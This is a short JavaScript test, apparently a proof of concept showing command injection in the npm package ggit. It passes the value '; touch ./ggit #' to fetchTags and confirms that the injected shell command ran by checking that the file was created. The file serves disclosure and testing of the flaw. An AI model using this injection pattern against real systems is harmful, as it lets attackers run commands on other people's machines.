test("Remote code execution in ggit", (done) => {
  const fs = require('fs');
  const { fetchTags } = require('ggit');

  const path = "./ggit";
  if (fs.existsSync(path))
    fs.unlinkSync(path);

  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  fetchTags("; touch ./ggit #").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, (err) => { done(); });
  });
});
